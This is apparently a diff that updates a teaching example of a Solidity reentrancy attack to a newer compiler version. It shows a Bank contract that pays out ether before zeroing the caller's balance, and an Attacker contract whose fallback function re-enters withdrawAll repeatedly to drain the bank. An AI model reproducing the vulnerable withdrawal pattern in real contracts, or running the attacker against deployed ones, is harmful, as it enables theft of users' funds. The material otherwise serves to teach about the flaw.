@@ -1,7 +1,10 @@
-pragma solidity ^0.4.8;
+// SPDX-License-Identifier: None
 
-    /*
-    https://solidity-by-example.org/sending-ether/
+pragma solidity =0.8.20;
+
+/***
+
+https://solidity-by-example.org/sending-ether/
 
     Which function is called, fallback() or receive()?
 
@@ -16,40 +19,35 @@ receive() exists?  fallback()
         yes   no
         /      \
     receive()   fallback()
-    */
+
+***/
 
 contract Bank {
-
-    mapping (address => uint) private userBalances;
+    mapping (address => uint) public userBalances;
 
     function stake() public payable {
         require(msg.value > 0);
         userBalances[msg.sender] += msg.value;
     }
 
-    function withdraw() public {
+    function withdrawAll() public {
         uint withdrawAmount = userBalances[msg.sender];
-        (bool success, ) = msg.sender.call.value(withdrawAmount)("");
+        (bool success, ) = msg.sender.call{value: withdrawAmount}("");
         require(success, "Withdraw failed");
         userBalances[msg.sender] = 0;
-    }
-
-    function getBalance() public view returns (uint) {
-        return userBalances[msg.sender];
     }
 
     function getTotalBalance() public view returns (uint) {
         return address(this).balance;
     }
-
 }
 
-contract Attack {
+contract Attacker {
     Bank b;
     uint public count;
     uint public limit;
 
-    function setVictimAddress(address victim) payable {
+    function setVictimAddress(address victim) payable public {
         b = Bank(victim);
     }
 
@@ -58,16 +56,15 @@ contract Attack {
     }
 
     function stake() public payable {
-        b.stake.value(msg.value)();
+        b.stake{value: msg.value}();
     }
 
-    function attack() {
-        b.withdraw();
+    function runTheBank() public {
+        b.withdrawAll();
     }
 
-    function() payable {
+    fallback() external payable {
         count++;
-        if(count < limit) b.withdraw();
+        if(count < limit) b.withdrawAll();
     }
-
 }
